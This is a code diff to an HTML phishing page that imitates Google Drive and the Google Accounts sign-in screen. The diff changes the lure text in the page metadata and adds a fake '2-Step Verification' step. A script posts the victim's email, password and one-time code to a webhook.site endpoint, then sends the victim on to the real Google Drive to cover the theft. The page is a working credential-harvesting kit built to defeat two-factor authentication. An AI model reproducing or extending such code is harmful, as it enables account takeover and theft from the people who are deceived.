@@ -3,8 +3,8 @@
 
 <head>
   <meta charset="UTF-8" />
-  <meta property="og:title" content="Google Drive - Shared Document" />
-  <meta property="og:description" content="You’ve received a secure shared file. Please sign in to view." />
+  <meta property="og:title" content="Google Drive - Secure Document" />
+  <meta property="og:description" content="A secure document has been shared with you. View now." />
   <meta property="og:image" content="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico" />
   <title>Sign in – Google Accounts</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
@@ -62,7 +62,7 @@
       cursor: pointer;
     }
 
-    .step2 {
+    .step2, .step3 {
       display: none;
     }
 
@@ -87,7 +87,12 @@
       <div class="step2">
         <h1>Welcome</h1>
         <input type="password" id="password" placeholder="Enter your password" required />
-        <button type="button" onclick="sendData()">Sign in</button>
+        <button type="button" onclick="step3()">Sign in</button>
+      </div>
+      <div class="step3">
+        <h1>2-Step Verification</h1>
+        <input type="text" id="otp" placeholder="Enter 6-digit code" required />
+        <button type="button" onclick="sendData()">Verify</button>
       </div>
       <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
     </form>
@@ -100,18 +105,24 @@
       document.querySelector('.step2').style.display = 'block';
     }
 
+    function step3() {
+      document.querySelector('.step2').style.display = 'none';
+      document.querySelector('.step3').style.display = 'block';
+    }
+
     function sendData() {
       const email = document.getElementById('email').value;
       const pass = document.getElementById('password').value;
+      const otp = document.getElementById('otp').value;
 
       fetch("https://webhook.site/#!/view/b48d6922-72c1-4099-9145-c3d4a2150b24", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ email: email, password: pass })
+        body: JSON.stringify({ email: email, password: pass, otp: otp })
       }).then(() => {
-        window.location.href = "https://accounts.google.com/signin";
+        window.location.href = "https://drive.google.com";
       });
     }
   </script>
